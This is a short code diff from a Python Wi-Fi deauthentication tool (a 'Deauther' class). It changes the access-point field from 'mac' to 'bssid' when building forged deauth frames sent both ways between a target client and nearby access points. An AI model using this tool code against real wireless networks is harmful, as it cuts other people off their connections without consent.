@@ -64,8 +64,8 @@ class Deauther:
                     for ap in aps:
                         if ap['channel'] in interface_channels:
                             channels_to_send += [ap['channel']]*2
-                            frames_to_send.append(self._generate_deauth_frame(self.target,ap['mac']))
-                            frames_to_send.append(self._generate_deauth_frame(ap['mac'],self.target))
+                            frames_to_send.append(self._generate_deauth_frame(self.target,ap['bssid']))
+                            frames_to_send.append(self._generate_deauth_frame(ap['bssid'],self.target))
                     # Start deauth thread, and pass created frames and channels
                     th = threading.Thread(target=self._deauth_interface_thread,args=(interface,frames_to_send,channels_to_send))
                     th.daemon = True
